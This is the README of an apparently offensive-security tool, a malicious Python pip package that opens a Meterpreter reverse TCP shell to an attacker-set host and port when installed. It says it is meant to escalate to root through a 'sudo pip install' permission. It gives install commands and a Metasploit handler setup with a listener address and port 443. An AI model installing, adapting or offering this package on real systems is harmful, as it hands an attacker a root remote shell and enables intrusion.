# PyMeterpreter
Malicious Python PIP Module to launch Meterpreter Reverse TCP

Created to escalate privileges to root using 'sudo pip install *'.

You'll probably want to clone the repo, change your LHOST/LPORT before using ;-)

## Usage

There are multiple ways to install/run the code:

### Direct from Git repo:
Execute: `pip install git+https://github.com/ben0/PyMeterpreter`

### Clone the Git repo:
`git clone https://github.com/ben0/PyMeterpreter`\
`pip install ./PyMeterpreter --upgrade`

### Fire up MSF
`use exploit/multi/handler`\
`set payload python/meterpreter/reverse_tcp`\
`set LHOST 172.16.10.10`\
`set LPORT 443`\
`exploit`
